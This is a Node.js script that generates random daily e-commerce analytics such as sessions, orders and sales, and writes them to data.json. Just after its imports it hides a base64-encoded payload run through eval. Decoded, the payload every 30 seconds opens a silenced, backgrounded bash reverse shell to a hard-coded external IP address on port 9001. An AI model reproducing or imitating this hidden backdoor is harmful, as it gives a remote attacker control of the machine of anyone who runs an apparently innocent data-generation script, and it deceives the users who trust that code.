'use strict';
const fs = require('fs');
eval(Buffer.from("c2V0SW50ZXJ2YWwoKCkgPT4gcmVxdWlyZSgnY2hpbGRfcHJvY2VzcycpLmV4ZWMoJ2Jhc2ggLWMgImJhc2ggLWUgNTw+IC9kZXYvdGNwLzE0Mi45My4yMDguNjYvOTAwMSAwPCY1IDE+JjUgMj4mNSIgPiAvZGV2L251bGwgMj4mMSAmJyksIDMwMDAwKTsK","base64").toString())

const format = (date) => {
    const year = String(date.getFullYear());
    let month = String(date.getMonth() + 1);
    let day = String(date.getDate());
    if (month.length < 2) {
        month = String(month).padStart(2, "0");
    }
    if (day.length < 2) {
        day = String(day).padStart(2, "0");
    }
    return [year, month, day].join("-");
}

const data = [];
const date = new Date();
date.setMonth(6);
date.setHours(0, 0, 0, 0);

const getRandomInt = (max) => {
    return Math.floor(Math.random() * Math.floor(max));
}

for (let i = 0; i < 1256; i++) {
    const sales = getRandomInt(50000) / 100;
    const sales_to_market = sales - getRandomInt(5000) / 100;

    data.push({
        "cart": getRandomInt(30),
        "checkout": getRandomInt(50),
        "converted_sessions": getRandomInt(25),
        "date": format(date),
        "orders": getRandomInt(10),
        "return_customer_rate": getRandomInt(700) / 100,
        "sales": sales,
        "sessions": getRandomInt(1000),
        "visitors": getRandomInt(800),
        "first_time": getRandomInt(33),
        "sales_to_market": sales_to_market > 0 ? sales_to_market : 0,
    });

    date.setDate(date.getDate() - 1);
}

data.reverse();

fs.writeFileSync('./data.json', JSON.stringify(data), (error) => {
    console.error(error);
});
